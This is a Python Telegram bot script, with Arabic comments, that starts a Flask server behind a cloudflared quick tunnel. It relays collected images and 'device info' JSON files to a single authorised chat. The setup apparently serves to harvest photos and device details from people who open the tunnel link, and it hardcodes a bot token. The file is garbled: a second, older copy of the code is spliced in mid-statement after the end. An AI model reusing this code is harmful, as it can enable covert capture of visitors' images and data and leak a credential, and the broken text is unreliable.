import os
import re
import subprocess
import time
from telegram.ext import ApplicationBuilder, CommandHandler

# =========================
# CONFIG (إعدادات البوت)
# =========================
BOT_TOKEN = "8612074749:AAGLniCsu_LAn3rUos4aZaqs5mRlz0QxCgE"
AUTHORIZED_CHAT_ID = 5087545397

flask_process = None
cloudflared_process = None

# حل مشكلة المسارات: تحديد مسار المجلد الحالي للسكريبت بدقة
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

images_folder = os.path.join(BASE_DIR, "images")
sent_folder = os.path.join(BASE_DIR, "sent")
metadata_folder = os.path.join(BASE_DIR, "metadata")
sent_info_folder = os.path.join(BASE_DIR, "infos_sent")

# إنشاء المجلدات في مسار السكريبت الصحيح
os.makedirs(images_folder, exist_ok=True)
os.makedirs(sent_folder, exist_ok=True)
os.makedirs(metadata_folder, exist_ok=True)
os.makedirs(sent_info_folder, exist_ok=True)


# دالة لفحص ما إذا كان الملف جاهزاً
def is_file_ready(filepath):
    try:
        if not os.path.exists(filepath):
            return False
        initial_size = os.path.getsize(filepath)
        time.sleep(0.3)
        return initial_size == os.path.getsize(filepath) and initial_size > 0
    except:
        return False


# =========================
# START SERVER
# =========================
async def start(update, context):
    global flask_process, cloudflared_process

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    if flask_process is None:
        # تشغيل الفلاسك من نفس مسار السكريبت
        flask_process = subprocess.Popen(["python", "app.py"], cwd=BASE_DIR)

        cloudflared_process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )

        tunnel_url = None
        for _ in range(50):
            line = cloudflared_process.stdout.readline()
            if not line:
                break
            match = re.search(r"https://[-a-z0-9]+\.trycloudflare\.com", line)
            if match:
                tunnel_url = match.group(0)
                break

        if tunnel_url:
            await update.message.reply_text(f"✅ Server Started\n🌍 {tunnel_url}")
        else:
            await update.message.reply_text("⚠️ Cloudflare URL not found")
    else:
        await update.message.reply_text("⚠️ Server already running")


# =========================
# STOP SERVER
# =========================
async def stop(update, context):
    global flask_process, cloudflared_process
    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return
    try:
        if flask_process:
            flask_process.kill()
            flask_process = None
        if cloudflared_process:
            cloudflared_process.kill()
            cloudflared_process = None
        await update.message.reply_text("🛑 Server stopped")
    except Exception as e:
        await update.message.reply_text(f"❌ Error:\n{e}")


# =========================
# SERVER STATUS
# =========================
async def status(update, context):
    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return
    if flask_process and flask_process.poll() is None:
        await update.message.reply_text("🟢 Server online")
    else:
        await update.message.reply_text("🔴 Server offline")


# =========================
# GET IMAGES
# =========================
async def images(update, context):
    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    # جلب جميع الملفات وتحويل أسمائها لحروف صغيرة للفحص لتجنب مشكلة الكابيتال (.JPG)
    try:
        all_files = os.listdir(images_folder)
    except Exception as e:
        await update.message.reply_text(f"❌ Cannot read folder:\n{e}")
        return

    files = [
        f
        for f in all_files
        if f.lower().endswith((".png", ".jpg", ".jpeg", ".webp"))
    ]
    files.sort()

    if len(files) == 0:
        await update.message.reply_text("⚠️ No new images found")
        return

    await update.message.reply_text(f"📸 Sending {len(files)} new images...")

    for file in files:
        image_path = os.path.join(images_folder, file)
        target_path = os.path.join(sent_folder, file)

        if not is_file_ready(image_path):
            continue

        try:
            with open(image_path, "rb") as img:
                await update.message.reply_photo(photo=img)

            if os.path.exists(target_path):
                name, ext = os.path.splitext(file)
                timestamp = int(time.time())
                target_path = os.path.join(
                    sent_folder, f"{name}_{timestamp}{ext}"
                )

            os.replace(image_path, target_path)
        except Exception as e:
            await update.message.reply_text(f"❌ Failed:\n{file}\n\n{e}")


# =========================
# GET INFOS
# =========================
async def infos(update, context):
    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    try:
        all_files = os.listdir(metadata_folder)
    except Exception as e:
        await update.message.reply_text(f"❌ Cannot read folder:\n{e}")
        return

    files = [f for f in all_files if f.lower().endswith(".json")]
    files.sort()

    if len(files) == 0:
        await update.message.reply_text("📭 No new metadata yet")
        return

    latest_file = files[-1]
    metadata_path = os.path.join(metadata_folder, latest_file)
    target_info_path = os.path.join(sent_info_folder, latest_file)

    if not is_file_ready(metadata_path):
        await update.message.reply_text("⏳ File is being written, try again...")
        return

    try:
        with open(metadata_path, "r", encoding="utf-8") as f:
            data = f.read()

        if len(data) > 4000:
            with open(metadata_path, "rb") as f:
                await update.message.reply_document(
                    document=f, filename=latest_file
                )
        else:
            await update.message.reply_text(f"📄 Latest Device Info:\n\n{data}")

        if os.path.exists(target_info_path):
            name, ext = os.path.splitext(latest_file)
            timestamp = int(time.time())
            target_info_path = os.path.join(
                sent_info_folder, f"{name}_{timestamp}{ext}"
            )

        os.replace(metadata_path, target_info_path)
    except Exception as e:
        await update.message.reply_text(f"❌ Error:\n{e}")


# =========================
# BOT INIT
# =========================
app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CommandHandler("status", status))
app.add_handler(CommandHandler("images", images))
app.add_handler(CommandHandler("infos", infos))

print("🤖 Bot running...")
app.run_polling()                "--url",
                "http://localhost:5000"
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        tunnel_url = None

        for line in cloudflared_process.stdout:

            match = re.search(
                r"https://[-a-z0-9]+\.trycloudflare\.com",
                line
            )

            if match:
                tunnel_url = match.group(0)
                break

        if tunnel_url:

            await update.message.reply_text(
                f"✅ Server Started\n🌍 {tunnel_url}"
            )

        else:

            await update.message.reply_text(
                "⚠️ Cloudflare URL not found"
            )

    else:

        await update.message.reply_text(
            "⚠️ Server already running"
        )


# STOP SERVER
async def stop(update, context):

    global flask_process
    global cloudflared_process

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    try:

        if flask_process:
            flask_process.kill()
            flask_process = None

        if cloudflared_process:
            cloudflared_process.kill()
            cloudflared_process = None

        await update.message.reply_text(
            "🛑 Server stopped"
        )

    except Exception as e:

        await update.message.reply_text(
            f"❌ Error:\n{e}"
        )


# SERVER STATUS
async def status(update, context):

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    if flask_process:

        await update.message.reply_text(
            "🟢 Server online"
        )

    else:

        await update.message.reply_text(
            "🔴 Server offline"
        )


# GET IMAGES
async def images(update, context):

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    folder = "images"

    files = sorted(os.listdir(folder))

    if not files:

        await update.message.reply_text(
            "⚠️ No images found"
        )

        return

    await update.message.reply_text(
        f"📸 Sending {len(files)} images..."
    )

    for file in files:

        path = os.path.join(folder, file)

        try:

            with open(path, "rb") as img:

                await update.message.reply_photo(
                    photo=img
                )

            # نقل الصورة بعد الإرسال
            os.rename(
                path,
                f"sent/{file}"
            )

        except Exception as e:

            await update.message.reply_text(
                f"❌ Error:\n{e}"
            )


# GET INFOS
async def infos(update, context):

    if update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return

    path = "metadata/latest.json"

    if not os.path.exists(path):

        await update.message.reply_text(
            "❌ No metadata found"
        )

        return

    try:

        with open(path, "r") as f:

            data = f.read()

        await update.message.reply_text(
            f"📄 Infos:\n\n{data}"
        )

    except Exception as e:

        await update.message.reply_text(
            f"❌ Error:\n{e}"
        )


# BOT
app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("stop", stop))
app.add_handler(CommandHandler("status", status))
app.add_handler(CommandHandler("images", images))
app.add_handler(CommandHandler("infos", infos))

print("🤖 Bot running...")

app.run_polling()
